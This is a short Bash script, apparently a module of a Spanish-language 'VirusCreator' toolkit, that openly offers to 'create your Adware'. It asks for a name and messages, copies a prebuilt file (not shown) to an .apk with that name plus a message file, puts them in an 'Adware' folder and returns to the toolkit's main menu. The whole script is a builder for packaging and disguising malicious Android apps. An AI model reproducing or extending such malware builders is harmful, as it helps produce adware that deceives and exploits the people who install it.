#!/bin/bash
clear
echo " _____ _             _____             _"
echo "|  |  |_|___ _ _ ___|     |___ ___ ___| |_ ___ ___"
echo "|  |  | |  _| | |_ -|   --|  _| -_| .'|  _| . |  _|"
echo " \___/|_|_| |___|___|_____|_| |___|__,|_| |___|_|"
echo "================="
echo "By=NePtYx=Adware="
echo "================="
echo " "
echo "¿Como quieres que se llame tu Adware (incluye extencion)?"
read input
echo " "
echo "¿Que mensajes quieres que diga?"
read input1
mkdir Adware
cp 1 $input.apk
mv $input.apk Adware
cp 4 $input1.txt
mv $input1.txt Adware
echo "Tu Adware a sido Creado esta en la carpeta"
echo "Adware"
echo " "
read input2
echo "Volviendo a menu principal"
bash VirusCreator.sh
